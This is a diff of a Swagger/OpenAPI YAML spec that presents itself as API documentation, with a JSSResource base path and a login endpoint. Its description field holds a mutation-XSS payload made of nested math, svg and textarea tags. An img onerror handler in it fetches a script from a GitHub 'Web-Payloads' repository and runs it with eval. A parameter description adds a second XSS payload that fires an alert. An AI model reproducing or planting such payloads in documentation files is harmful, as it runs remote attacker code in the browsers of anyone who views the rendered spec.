@@ -1,21 +1,29 @@
-swagger: "2.0"
+swagger: '2.0'
 info:
-  version: "v1"
-  title: Please login first
-description: |
-    <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/itssixtyn3in/Web-Payloads/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
-
-    https://raw.githubusercontent.com/itssixtyn3in/Web-Payloads/main/script.js
-host: 
-
+  title: Classic API Resource Documentation
+  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/itssixtyn3in/Web-Payloads/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
-
   /{Username}/{Password}:
     post:
       summary: Logs in
       parameters:
-              - description: |
+        - description: |
             <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
         - name: Username 
           required: true
           in: path
